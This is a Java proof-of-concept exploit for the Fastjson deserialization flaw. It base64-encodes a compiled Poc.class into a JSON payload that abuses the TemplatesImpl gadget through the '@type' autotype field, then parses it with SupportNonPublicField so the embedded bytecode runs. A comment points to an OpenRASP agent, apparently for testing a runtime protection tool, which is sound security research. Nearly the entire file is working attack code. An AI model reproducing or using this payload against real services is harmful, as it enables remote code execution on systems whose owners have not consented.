import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.Feature;

public class Exploit {
    // -javaagent:/Users/nine/Desktop/fastjson/src/javaopenrasp.jar

    public static void main(String[] args) throws IOException, InterruptedException {
        //to compile the payload
//        Runtime.getRuntime().exec("javac Poc.java", null, new File("./src"));
//        Thread.sleep(3000);

        // to read the poc payload
        File payloadFile = new File("./src/Poc.class");
        byte[] payloadContent = new byte[(int) payloadFile.length()];
        FileInputStream fileInputStream = new FileInputStream(payloadFile);
        fileInputStream.read(payloadContent);
        fileInputStream.close();

        // to create the payload
        String evilPayload = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"," +
                "\"_bytecodes\":[\"AAAAAAAAAA\"]," +
                "\"_name\":\"a.b\"," +
                "\"_tfactory\":{ }," +
                "\"_outputProperties\":{ }," +
                "\"_version\":\"1.0\"," +
                "\"allowedProtocols\":\"all\"" +
            "}";
        evilPayload = evilPayload.replace("AAAAAAAAAA", Base64.encode(payloadContent));


        // the deserialize operation
        JSONObject obj = JSON.parseObject(evilPayload, Feature.SupportNonPublicField);
    }
}
